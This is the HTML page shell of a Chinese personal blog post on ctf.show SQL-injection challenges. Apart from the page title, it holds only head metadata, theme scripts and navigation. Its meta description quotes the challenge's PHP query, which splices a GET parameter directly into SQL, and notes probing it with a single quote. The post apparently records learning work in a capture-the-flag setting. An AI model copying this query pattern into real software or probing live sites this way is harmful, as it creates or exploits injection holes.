<!DOCTYPE html>

<head>
	
	<title>sql - wanan</title>
	<meta charset="utf-8">
	
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
	
	<meta name="description" content="web171注入学习  $sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;  象征性测试下闭合方式 1    正常 1&#39;    异常 1&amp;quot">
<meta property="og:type" content="article">
<meta property="og:title" content="sql">
<meta property="og:url" content="https://lovewanan.github.io/ctfshow/ctf.show/sql/index.html">
<meta property="og:site_name" content="wanan">
<meta property="og:description" content="web171注入学习  $sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;  象征性测试下闭合方式 1    正常 1&#39;    异常 1&amp;quot">
<meta property="og:locale">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262159528.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262202465.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262203899.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262204734.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262205150.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271016776.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271017854.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301345625.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301335972.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301358191.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407094914986.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407095103698.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407095244739.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407095715741.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407102847062.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407103005812.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407103025956.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407130358634.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407124216316.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407130600142.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407130612382.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407130913425.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407131027613.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407131136762.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407135553899.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407140553761.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407141724604.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407150732592.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407153242084.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407153406158.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407153535740.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407154415679.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407154509937.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407155009165.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407155019582.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407180508467.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407180601416.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407180656002.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407182514272.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407200618827.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407203541626.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407203858410.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407203933797.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407203955653.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407204001885.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407210406203.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407210921431.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407215132018.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407214810805.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407221144978.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407221504134.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407222705713.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407222740808.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407223832502.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407223908157.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407223941771.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408110118163.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408110151699.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408110311009.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408124221533.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408132254910.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408142736722.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408172145807.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408184439334.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408211002396.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408211135617.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408212617134.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408213246662.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408214846588.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408215003341.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408215023841.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408220113624.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408220136403.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408220153265.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408221302428.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408221705966.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408221725973.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151506062.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151507620.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151510055.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151510359.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151511268.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151513103.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151514104.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151516959.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151519393.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151529964.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409101024519.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409101420720.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409101938137.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409102115511.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409102337468.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409102757765.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103050744.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103315126.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103537495.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103848475.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103833385.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409104334331.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409105435149.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409105751661.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409115745252.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409115907938.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409115915740.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120324788.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120619242.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120634772.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120851488.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120950191.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120958493.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121038900.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121050832.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121236464.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121533936.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121540848.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121935402.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409122028791.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409122041955.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409123445710.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409123642991.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409123657096.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409124924898.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409125442979.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409131541223.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409131756459.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409131947051.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409132736975.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409132921712.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409132917871.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409135233790.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409135326914.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409135940440.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409140732039.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144401500.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144445953.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144506190.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144557902.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144722019.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409150349590.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409150536078.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409150527537.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409150627591.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409151108797.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409151155741.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409151505085.png">
<meta property="article:published_time" content="2022-04-17T14:37:17.275Z">
<meta property="article:modified_time" content="2022-04-18T07:29:35.764Z">
<meta property="article:author" content="wanan">
<meta property="article:tag" content="ctf.show">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262159528.png">

	<meta name="theme-color" content="#5e72e4">
	<meta name="theme-color-rgb" content="94,114,228">
	<meta name="theme-color-origin" content="#5e72e4">
	<meta name="argon-enable-custom-theme-color" content="true">
	<meta name="theme-card-radius" content="4">
	<meta name="theme-version" content="1.0.2">
	<link rel="icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/wanan.ico" type="image/x-icon">
	<link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/wanan.ico" type="image/x-icon">

	
<link rel="stylesheet" href="/assets/argon_css_merged.css">

	
<link rel="stylesheet" href="/style.css">

	
<link rel="stylesheet" href="//fonts.loli.net/css?family=Open+Sans:300,400,600,700|Noto+Serif+SC:300,600&display=swap.css">

	
<script src="/assets/argon_js_merged.js"></script>

	
<script src="/assets/js/argon.min.js"></script>

	
<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


	

	<script>
		var argonConfig = {
			language: "zh_CN",
			
				zoomify: {
					duration: 200,
					easing: "cubic-bezier(0.4,0,0,1)",
					scale: 0.9
				},
			
			pangu: "false",
			
				lazyload: {
					threshold: 800,
					effect: "fadeIn"
				},
			
			disable_pjax: false,
			headroom: false
		}
	</script>
	<script>
		var darkmodeAutoSwitch = "false";
		function setDarkmode(enable){
			if (enable == true){
				$("html").addClass("darkmode");
			}else{
				$("html").removeClass("darkmode");
			}
			$(window).trigger("scroll");
		}
		function toggleDarkmode(){
			if ($("html").hasClass("darkmode")){
				setDarkmode(false);
				sessionStorage.setItem("Argon_Enable_Dark_Mode", "false");
			}else{
				setDarkmode(true);
				sessionStorage.setItem("Argon_Enable_Dark_Mode", "true");
			}
		}
		if (sessionStorage.getItem("Argon_Enable_Dark_Mode") == "true"){
			setDarkmode(true);
		}
		function toggleDarkmodeByPrefersColorScheme(media){
			if (sessionStorage.getItem('Argon_Enable_Dark_Mode') == "false" || sessionStorage.getItem('Argon_Enable_Dark_Mode') == "true"){
				return;
			}
			if (media.matches){
				setDarkmode(true);
			}else{
				setDarkmode(false);
			}
		}
		function toggleDarkmodeByTime(){
			if (sessionStorage.getItem('Argon_Enable_Dark_Mode') == "false" || sessionStorage.getItem('Argon_Enable_Dark_Mode') == "true"){
				return;
			}
			let hour = new Date().getHours();
			if (hour < 7 || hour >= 22){
				setDarkmode(true);
			}else{
				setDarkmode(false);
			}
		}
		if (darkmodeAutoSwitch == 'system'){
			var darkmodeMediaQuery = window.matchMedia("(prefers-color-scheme: dark)");
			darkmodeMediaQuery.addListener(toggleDarkmodeByPrefersColorScheme);
			toggleDarkmodeByPrefersColorScheme(darkmodeMediaQuery);
		}
		if (darkmodeAutoSwitch == 'time'){
			toggleDarkmodeByTime();
		}
		if (darkmodeAutoSwitch == 'alwayson'){
			setDarkmode(true);
		}

		function toggleAmoledDarkMode(){
			$("html").toggleClass("amoled-dark");
			if ($("html").hasClass("amoled-dark")){
				localStorage.setItem("Argon_Enable_Amoled_Dark_Mode", "true");
			}else{
				localStorage.setItem("Argon_Enable_Amoled_Dark_Mode", "false");
			}
		}
		if (localStorage.getItem("Argon_Enable_Amoled_Dark_Mode") == "true"){
			$("html").addClass("amoled-dark");
		}else if (localStorage.getItem("Argon_Enable_Amoled_Dark_Mode") == "false"){
			$("html").removeClass("amoled-dark");
		}
	</script>
	<script>
		if (navigator.userAgent.indexOf("Safari") !== -1 && navigator.userAgent.indexOf("Chrome") === -1){
			$("html").addClass("using-safari");
		}
	</script>

	
		
<script src="/assets/vendor/smoothscroll/smoothscroll1.js"></script>

	
<meta name="generator" content="Hexo 6.0.0"></head>



<style id="themecolor_css">
	
	:root{
		--themecolor: #5e72e4;
		--themecolor-dark0: #5368E2;
		--themecolor-dark: #485FE0;
		--themecolor-dark2: #324CDD;
		--themecolor-dark3: #233DD2;
		--themecolor-light: #8A98EB;
		--themecolor-rgbstr: 94,114,228;
		--themecolor-gradient: linear-gradient(150deg,var(--themecolor-light) 15%, var(--themecolor) 70%, var(--themecolor-dark0) 94%);

	}
</style>
<style id="theme_cardradius_css">
	:root{
		--card-radius: 4px;
	}
</style>

<body>
<div id="toolbar">
	<header class="header-global">
		<nav id="navbar-main" class="navbar navbar-main navbar-expand-lg navbar-transparent navbar-light bg-primary headroom--not-bottom headroom--not-top headroom--pinned">
			<div class="container">
				
				<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbar_global" aria-controls="navbar_global" aria-expanded="false" aria-label="Toggle navigation">
					<span class="navbar-toggler-icon"></span>
				</button>
				<a class="navbar-brand" href="/">wanan</a>
				<div class="navbar-collapse collapse" id="navbar_global">
					<div class="navbar-collapse-header">
						<div class="row">
							<div class="col-6 collapse-brand"></div>
							<div class="col-6 collapse-close">
								<button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar_global" aria-controls="navbar_global" aria-expanded="false" aria-label="Toggle navigation">
									<span></span>
									<span></span>
								</button>
							</div>
						</div>
					</div>
					<ul id="navbar_search_btn_mobile" class="navbar-nav align-items-lg-center ml-lg-auto">
						<li class="nav-item" data-toggle="modal" data-target="#argon_search_modal" style="padding-left: 5px;">
							<a class="nav-link nav-link-icon">
								<i class="fa fa-search"></i>
								<span class="nav-link-inner--text d-lg-none">搜索</span>
							</a>
						</li>
					</ul>
					
							<ul class='navbar-nav navbar-nav-hover align-items-lg-center'>
								
										<li class='nav-item'>
											<a href='/' class='nav-link' >
												<i class='ni ni-book-bookmark d-lg-none'></i>
												<span class='nav-link-inner--text'>首页</span>
											</a>
											
										</li>
									
										<li class='nav-item dropdown'>
											<a href='' class='nav-link' onclick='return false;' data-toggle='dropdown' no-pjax>
												<i class='ni ni-book-bookmark d-lg-none'></i>
												<span class='nav-link-inner--text'>分类</span>
											</a>
											
													<div class="dropdown-menu">
														
															<a href='/categories/ctf/' class='dropdown-item'>ctf</a>
														
															<a href='/categories/ctf/sql%E6%B3%A8%E5%85%A5/' class='dropdown-item'>sql注入</a>
														
															<a href='/categories/java%E7%9F%A5%E8%AF%86/' class='dropdown-item'>java知识</a>
														
															<a href='/categories/ctf/php%E7%9F%A5%E8%AF%86' class='dropdown-item'>php知识</a>
														
															<a href='/categories/BUUCTF' class='dropdown-item'>BUUCTF</a>
														
															<a href='/categories/Linux' class='dropdown-item'>Linux</a>
														
															<a href='/categories/ctfshow' class='dropdown-item'>ctf.show</a>
														
													</div>
												
										</li>
									
							</ul>
						
					<ul class="navbar-nav align-items-lg-center ml-lg-auto">
						<li class="nav-item" data-toggle="modal" data-target="#argon_search_modal" id="navbar_search_btn_pc">
							<a class="nav-link nav-link-icon">
								<i class="fa fa-search"></i>
								<span class="nav-link-inner--text d-lg-none">搜索</span>
							</a>
						</li>
					</ul>
				</div>
				
				<div id="navbar_menu_mask" data-toggle="collapse" data-target="#navbar_global"></div>
			</div>
		</nav>
	</header>
</div>
<div class="modal fade" id="argon_search_modal" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title">搜索</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<!-- TODO -->
<div class="form-group mb-3">
	<div class="input-group input-group-alternative">
		<div class="input-group-prepend">
			<span class="input-group-text"><i class="fa fa-search"></i></span>
		</div>
		<input id="local-search-input" class="form-control" placeholder="搜索什么..." type="text"  autocomplete="off" data-search.path="search.xml" data-config.root="/">
	</div>
	<div id="local-search-result"></div>
</div>

			</div>
		</div>
	</div>
</div>
<!--Banner-->
<section id="banner" class="banner section section-lg section-shaped">
	<div class="shape shape-style-1 shape-primary">
		<span></span>
		<span></span>
		<span></span>
		<span></span>
		<span></span>
		<span></span>
		<span></span>
		<span></span>
		<span></span>
	</div>

	
	<div id="banner_container" class="banner-container container text-center">
		
			<div class="banner-title text-white"><span class="banner-title-inner">wanan</span>
		
		</div>
	</div>
	
		<style>
			section.banner{
				background-image: url(/assets/img/banner.jpg) !important;
			}
		</style>
	
</section>


	<style>
		#content:before {
			content: '';
			display: block;
			position: fixed;
			left: 0;
			right: 0;
			top: 0;
			bottom: 0;
			z-index: -2;
			background: url(/assets/img/banner.jpg);
			background-position: center;
			background-size: cover;
			background-repeat: no-repeat;
			opacity: 1;
			transition: opacity .5s ease;
		}
		html.darkmode #content:before{
			filter: brightness(0.65);
		}
		
			#content:after {
				content: '';
				display: block;
				position: fixed;
				left: 0;
				right: 0;
				top: 0;
				bottom: 0;
				z-index: -2;
				background: url(/assets/img/banner.jpg);
				background-position: center;
				background-size: cover;
				background-repeat: no-repeat;
				opacity: 0;
				transition: opacity .5s ease;
			}
			html.darkmode #content:after {
				opacity: 1;
			}
			html.darkmode #content:before {
				opacity: 0;
			}
		
		
			#banner, #banner .shape {
				background: transparent !important;
			}
		
	</style>




<div id="float_action_buttons" class="float-action-buttons fabtns-unloaded">
	<button id="fabtn_toggle_sides" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-hidden="true" tooltip-move-to-left="移至左侧" tooltip-move-to-right="移至右侧">
		<span class="btn-inner--icon fabtn-show-on-right"><i class="fa fa-caret-left"></i></span>
		<span class="btn-inner--icon fabtn-show-on-left"><i class="fa fa-caret-right"></i></span>
	</button>
	<button id="fabtn_back_to_top" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-label="Back To Top" tooltip="回到顶部">
		<span class="btn-inner--icon"><i class="fa fa-angle-up"></i></span>
	</button>
	<button id="fabtn_go_to_comment" class="btn btn-icon btn-neutral fabtn shadow-sm d-none" type="button" <-% theme.fab_show_gotocomment_button ? "" : "style='display: none;'"  aria-label="Comment" tooltip="评论">
		<span class="btn-inner--icon"><i class="fa fa-comment-o"></i></span>
	</button>
	<button id="fabtn_toggle_darkmode" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" <-% theme.fab_show_darkmode_button ? "" : "style='display: none;'"  aria-label="Toggle Darkmode" tooltip-darkmode="夜间模式" tooltip-blackmode="暗黑模式" tooltip-lightmode="日间模式">
		<span class="btn-inner--icon"><i class="fa fa-moon-o"></i><i class='fa fa-lightbulb-o'></i></span>
	</button>
	<button id="fabtn_toggle_blog_settings_popup" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" <-% theme.fab_show_settings_button ? "" : "style='display: none;'"  aria-label="Open Blog Settings Menu" tooltip="设置">
		<span class="btn-inner--icon"><i class="fa fa-cog"></i></span>
	</button>
	<div id="fabtn_blog_settings_popup" class="card shadow-sm" style="opacity: 0;" aria-hidden="true">
		<div id="close_blog_settings"><i class="fa fa-close"></i></div>
		<div class="blog-setting-item mt-3">
			<div style="transform: translateY(-4px);"><div id="blog_setting_toggle_darkmode_and_amoledarkmode" tooltip-switch-to-darkmode="切换到夜间模式" tooltip-switch-to-blackmode="切换到暗黑模式"><span>夜间模式</span><span>暗黑模式</span></div></div>
			<div style="flex: 1;"></div>
			<label id="blog_setting_darkmode_switch" class="custom-toggle">
				<span class="custom-toggle-slider rounded-circle"></span>
			</label>
		</div>
		<div class="blog-setting-item mt-3">
			<div style="flex: 1;">字体</div>
			<div>
				<button id="blog_setting_font_sans_serif" type="button" class="blog-setting-font btn btn-outline-primary blog-setting-selector-left">Sans Serif</button><button id="blog_setting_font_serif" type="button" class="blog-setting-font btn btn-outline-primary blog-setting-selector-right">Serif</button>
			</div>
		</div>
		<div class="blog-setting-item mt-3">
			<div style="flex: 1;">阴影</div>
			<div>
				<button id="blog_setting_shadow_small" type="button" class="blog-setting-shadow btn btn-outline-primary blog-setting-selector-left">浅阴影</button><button id="blog_setting_shadow_big" type="button" class="blog-setting-shadow btn btn-outline-primary blog-setting-selector-right">深阴影</button>
			</div>
		</div>
		<div class="blog-setting-item mt-3 mb-3">
			<div style="flex: 1;">滤镜</div>
			<div id="blog_setting_filters" class="ml-3">
				<button id="blog_setting_filter_off" type="button" class="blog-setting-filter-btn ml-0" filter-name="off">关闭</button>
				<button id="blog_setting_filter_sunset" type="button" class="blog-setting-filter-btn" filter-name="sunset">日落</button>
				<button id="blog_setting_filter_darkness" type="button" class="blog-setting-filter-btn" filter-name="darkness">暗化</button>
				<button id="blog_setting_filter_grayscale" type="button" class="blog-setting-filter-btn" filter-name="grayscale">灰度</button>
			</div>
		</div>
		<div class="blog-setting-item mb-3">
			<div id="blog_setting_card_radius_to_default" style="cursor: pointer;" tooltip="恢复默认">圆角</div>
			<div style="flex: 1;margin-left: 20px;margin-right: 8px;transform: translateY(2px);">
				<div id="blog_setting_card_radius"></div>
			</div>
		</div>
		
			<div class="blog-setting-item mt-1 mb-3">
				<div style="flex: 1;">主题色</div>
				<div id="theme-color-picker" class="ml-3"></div>
			</div>
		
	</div>
	<button id="fabtn_open_sidebar" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-label="Open Sidebar Menu" tooltip="菜单">
		<span class="btn-inner--icon"><i class="fa fa-bars"></i></span>
	</button>
	<button id="fabtn_reading_progress" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-hidden="true" tooltip="阅读进度">
		<div id="fabtn_reading_progress_bar" style="width: 0%;"></div>
		<span id="fabtn_reading_progress_details">0%</span>
	</button>
</div>

<div id="content" class="site-content">


	<script src="https://cdn.jsdelivr.net/npm/@waline/client"></script>



	<script>
		var _hmt = _hmt || [];
		(function() {
		  var hm = document.createElement("script");
		  hm.src = "https://hm.baidu.com/hm.js?853baf6befa4784c85c2f47223a04efb" ;
		  var s = document.getElementsByTagName("script")[0]; 
		  s.parentNode.insertBefore(hm, s);
		})();
		</script>
		






